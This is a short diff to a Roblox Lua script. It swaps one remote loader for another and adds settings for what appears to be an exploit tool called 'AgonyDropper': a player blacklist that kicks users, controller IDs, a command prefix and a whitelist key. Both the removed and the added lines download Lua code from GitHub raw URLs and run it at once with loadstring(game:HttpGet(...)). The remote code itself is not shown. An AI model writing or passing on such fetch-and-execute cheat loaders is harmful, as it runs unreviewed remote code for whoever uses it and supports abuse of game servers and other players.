@@ -1,1 +1,29 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LuxeCommands/L/main/e"))()
+if game.Players.LocalPlayer.Name == "Hax0963" then
+return
+end
+
+BlackList = {
+0,
+
+
+
+}
+
+if table.find(BlackList, game:GetService("Players").LocalPlayer.UserId) then
+    game.Players.LocalPlayer:Kick("Blacklisted")
+else
+end
+
+
+_G.AgonyDropper = {
+
+    Controllers = {
+        "903327775",
+    },
+    
+    Prefix = "!",
+    
+    WhitelistKey = "FREETRIAL2022"
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/AgonyDropper/main/Loader.lua"))()
